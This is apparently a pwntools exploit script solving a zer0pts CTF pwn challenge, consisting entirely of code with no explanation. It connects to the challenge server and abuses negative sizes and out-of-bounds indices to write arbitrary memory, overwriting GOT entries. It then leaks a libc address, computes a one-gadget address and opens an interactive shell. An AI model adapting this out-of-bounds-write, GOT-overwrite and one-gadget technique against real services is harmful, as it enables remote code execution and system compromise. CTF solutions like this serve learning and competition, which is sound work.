#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.ctf.zer0pts.com', 9004
binary = './chall'

elf = ELF("chall")
libc = ELF("libc.so.6")

context.arch = "amd64"
#context.log_level = "debug"
#context.aslr = False

def getupper(val):
    return (val & 0xffffffff00000000) >> 32

def getlower(val):
    return val & 0xffffffff

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

main = 0x0000000000400737
start = 0x0000000000400650
puts_plt = 0x00000000004005e0
printf_plt = 0x0000000000400600
near_printf = 0x00000000004007a8
near_scanf = 0x00000000004007b9
pop_rdi = 0x00000000004008c3
nop = 0x00000000004008d4
setvbuf = 0x0000000000601020

if __name__=="__main__":
    #io=process("./chall",env = {"LD_PRELOAD" : "./libc.so.6"})
    io = remote(remote_ip,port)
    sla("n = ","-1")
    sla("i = ","1573894")
    sla("] = ",str(0x0000000000400737))
    sla("n = ","-1")
    sla("i = ","1573906")
    sla("] = ",str(0x00000000004007a8))
    sla("n = ","-1")
    sla("i = ","1573894")
    sla("] = ",str(0x0000000000400788))
    sla("i = ","1573902")
    sla("] = ",str(0x0000000000400600))
    sla("i = ","1573903")
    sla("] = ","0")
    sla("i = ","1573894")
    sla("] = ",str(0x0000000000400737))
    sla("n = ","0")
    sla("i = ","-1072167918")
    sla("] = ",str(0x0000000040082100))
    sla("n = ",str(0x601060))
    leak = u64(io.recv(6)+"\x00\x00")-0x1ec6a0
    log.info("libc @ "+str(hex(leak)))
    one = leak+0xe6e79
    one = one << 16
    upper = one & 0xffff0000
    middle = one >> 8
    middle = middle & 0xffffffff
    last = one >> 16
    last = last >> 24
    log.info("one @ "+str(hex(one)))
    sla("i = ","1573904")
    sla("] = ",str(upper))
    sla("n = ","0")
    sla("i = ","-1072167918")
    sla("] = ",str(middle))
    sla("n = ","0")
    #gdb.attach(io)
    sla("i = ","-1072167917")
    sla("] = ",str(last))
    io.interactive()
